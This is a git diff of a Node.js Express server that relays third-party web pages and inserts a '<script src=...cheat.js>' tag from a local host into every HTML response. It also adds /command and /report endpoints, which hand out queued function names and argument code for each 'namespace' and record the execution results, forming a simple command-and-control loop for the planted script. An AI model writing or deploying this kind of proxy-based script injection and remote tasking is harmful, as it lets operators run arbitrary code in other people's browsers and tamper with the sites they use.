@@ -4,7 +4,11 @@ var bodyParser = require('body-parser')
 var _ = require('lodash')
 var jsonParser = bodyParser.json()
 var urlencodedParser = bodyParser.urlencoded({ extended: false })
+var models  = require('./models')
+var async = require("async")
 var app = express();
+var sequelize = models.sequelize
+
 app.set('port', process.env.PORT || 8008);
 app.enable('verbose errors');
 
@@ -17,8 +21,90 @@ app.use(express.static(__dirname + '/public'));
 var urls = ['http://112.74.141.140/amuc/api/activity/getActivityList']
 
 app.get("/command", function(req, res){
-  console.log("request ok")
-  res.jsonp({ready: 1, code: "console.log('ok')"})
+  if(!!!req.query.namespace){
+    res.jsonp({error: 1, msg: "params erorr"})
+  }else{
+    async.waterfall([function(next){
+      models.Commands.findOne({
+        where: {
+          namespace: req.query.namespace,
+          state: models.Commands.STATUS["初始化"]
+        },
+        order: [['createdAt']]
+      }).then(function(command){
+        if(command){
+          next(null, command)
+        }else{
+          next(new Error("no command, wait"))
+        }
+      }).catch(function(err){
+        console.log(err)
+        next(err)
+      })
+    }, function(command, next){
+      sequelize.query("UPDATE `Commands` SET `state`=:state,`updatedAt`=NOW() WHERE `id` = :id AND state=:old",
+        { replacements: { state: models.Commands.STATUS["正在运行"], id: command.id, old: models.Commands.STATUS["初始化"] } }).then(function(result){
+          if(result.length>0 && result[0].affectedRows >= 1){
+            next(null, command)
+          }else{
+            next(new Error("command runned"))
+          }
+        }).catch(function(err){
+          next(err)
+        })
+    }], function(err, command){
+      if(err){
+        res.jsonp({error: 1, msg: err.message})
+      }else{
+        res.jsonp({ready: 1, funName: command.funName, argsCode: command.argsCode, id: command.id})
+      }
+    })
+  }
+})
+
+app.get("/report", function(req, res){
+  var namespace = req.query.namespace,
+      id = req.query.id,
+      result = req.query.result,
+      success = req.query.success
+  console.log(namespace, ",", id, ",", result);
+  if(namespace && id && result !== 'undefined'){
+    async.waterfall([function(next){
+      models.Commands.findOne({
+        where: {
+          id: id,
+          namespace: namespace,
+          state: models.Commands.STATUS["正在运行"]
+        }
+      }).then(function(command){
+        if(command){
+          next(null, command)
+        }else{
+          next(new Error("not found"))
+        }
+      }).catch(function(err){
+        next(err)
+      })
+    }, function(command, next){
+      if(success){
+        var newState = models.Commands.STATUS["运行成功"]
+      }else{
+        var newState = models.Commands.STATUS["运行失败"]
+      }
+      command.updateAttributes({
+        state: newState,
+        resultCode: result
+      })
+    }], function(err, rult){
+      if(err){
+        res.jsonp({error: 1, msg: err.message})
+      }else{
+        res.jsonp({error: 0, msg: "success"})
+      }
+    })
+  }else{
+    res.jsonp({error: 1, msg: "params miss"})
+  }
 })
 
 app.use("*", function(req, res, next) {
@@ -95,7 +181,8 @@ app.use("*", function(req, res, next) {
           console.log(data)
           try{
             if(data.indexOf('</body>') !== -1){
-              data = data.replace('</body>', '<script src="http://192.168.1.46:8008/cheat.js"></script></body>')
+              var t = (new Date()).getTime()
+              data = data.replace('</body>', '<script src="http://192.168.1.46:8008/cheat.js?'+t+'"></script></body>')
             }
             console.log("data", data)
           }catch(e){
